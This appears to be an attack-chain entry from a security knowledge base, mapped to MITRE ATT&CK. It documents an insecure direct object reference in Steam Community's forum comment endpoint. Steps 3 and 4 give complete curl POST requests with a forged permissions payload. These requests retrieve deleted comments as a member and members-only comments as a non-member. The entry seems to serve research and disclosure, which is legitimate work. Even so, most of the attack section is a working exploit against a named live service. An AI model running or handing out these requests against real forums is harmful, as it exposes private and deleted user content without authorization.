---
tags:
  - idor
  - steam
  - forums
  - unauthorized-access
  - deleted-comments
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Prepare-Steam-Forum-for-IDOR-Testing]]'
  - '[[procedures/Extract-Forum-and-Discussion-IDs-from-Page-Source]]'
  - '[[procedures/Exploit-IDOR-to-Access-Deleted-Comments-as-Member]]'
  - >-
    [[procedures/Exploit-IDOR-to-Access-Unauthorized-Forum-Comments-as-Non-Member]]
step_count: 4
techniques:
  - '[[Data from Information Repositories]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:29:56.684Z'
description: >-
  Multi-stage attack exploiting an Insecure Direct Object Reference (IDOR)
  vulnerability in the Steam Community forum comment fetching endpoint to gain
  unauthorized read access to deleted comments and restricted forum discussions.
skill_level: intermediate
impact_level: high
id: 0fb9979d-615b-4ee2-9963-2488d4c81891
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Data from Information Repositories]]'
  - '[[Exploit Public-Facing Application]]'
---
# IDOR in Steam Community Forums to Access Deleted and Unauthorized Comments

Multi-stage attack chain demonstrating exploitation of an IDOR vulnerability in Steam Community forums, allowing members to read deleted comments and non-members to access all comments on restricted forums.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Forum] --> B[Extract IDs]
    B --> C[Fetch as Member]
    C --> D[Fetch as Non-Member]
    D --> E[Observe Unauthorized Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser (e.g., Firefox) for page inspection
- cURL or similar HTTP client for POST requests

### Target Environment

- Steam Community web platform
- Access to group forums with configurable permissions
- No specific ports required (HTTPS on 443)

### Initial Access Requirements

- Valid Steam account for member access (group member)
- Another Steam account or session for non-member access
- Network access to steamcommunity.com

## Detailed Attack Procedures

### Step 1: Prepare Forum Environment
procedure: [[procedures/Prepare-Steam-Forum-for-IDOR-Testing]]

**Objective**: Configure a test forum with restricted permissions and create discussions to simulate the vulnerability.

**Instructions**: Log in as a group admin and set forum permissions so members can view discussions but not deleted comments, while non-members have no access. Create a discussion, add comments, and delete some to prepare for testing.

**Expected Output**: A discussion with visible and deleted comments, ready for ID extraction.

**Success Indicators**:
- Forum permissions configured correctly
- Discussion created with at least one deleted comment

### Step 2: Extract Identifiers
procedure: [[procedures/Extract-Forum-and-Discussion-IDs-from-Page-Source]]

**Objective**: Obtain GroupId, forumId, and discussionId from the target discussion page to craft malicious requests.

**Instructions**: Visit the discussion as a member, inspect the page source, and search for 'forumtopic_' to locate the IDs in the format ForumTopic_GroupID_forumID_discussionID.

**Expected Output**: Extracted IDs, e.g., GroupId=103582791461362746, forumId=1692659135923574526, discussionId=1692659769940104935.

**Success Indicators**:
- IDs successfully parsed from HTML
- Valid format confirmed

### Step 3: Access Deleted Comments as Member
procedure: [[procedures/Exploit-IDOR-to-Access-Deleted-Comments-as-Member]]

**Objective**: Use member credentials to fetch all comments, including deleted ones, bypassing visibility restrictions.

**Instructions**: Craft and send a POST request to the vulnerable endpoint using member session cookies and the extracted discussionId in the feature2 parameter. Use [[commands/steam-comment-fetch-member]]:

```bash
curl -X POST 'https://steamcommunity.com/comment/ForumTopic/delete/103582791461362746/1692659135923574526/' \
  -H 'Cookie: ***member-cookies***' \
  -d 'gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=1692659769940104935&oldestfirst=true&include_raw=true'
```

Search the response for 'comments_raw' to verify deleted comments are included.

**Expected Output**: JSON response with 'comments_raw' array containing deleted comments.

**Success Indicators**:
- Deleted comments visible in response
- No permission errors

### Step 4: Access Restricted Comments as Non-Member
procedure: [[procedures/Exploit-IDOR-to-Access-Unauthorized-Forum-Comments-as-Non-Member]]

**Objective**: Use non-member credentials to fetch comments from a members-only forum, demonstrating full unauthorized access.

**Instructions**: Repeat the POST request using non-member session cookies and the same IDs. Use [[commands/steam-comment-fetch-nonmember]]:

```bash
curl -X POST 'https://steamcommunity.com/comment/ForumTopic/delete/103582791461362746/1692659135923574526/' \
  -H 'Cookie: ***non-member-cookies***' \
  -d 'gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=1692659769940104935&oldestfirst=true&include_raw=true'
```

Search the response for 'comments_raw' to confirm all comments, including deleted, are exposed.

**Expected Output**: JSON response with full 'comments_raw' array for the restricted forum.

**Success Indicators**:
- All comments accessible without membership
- Deleted comments included

## Attack Chain Summary

### Key Achievements

1. Bypassed permission checks to read deleted comments as authorized users
2. Enabled non-members to access private forum discussions
3. Demonstrated IDOR impact on data confidentiality in Steam forums

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Data from Information Repositories]] Data from Information Repositories
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
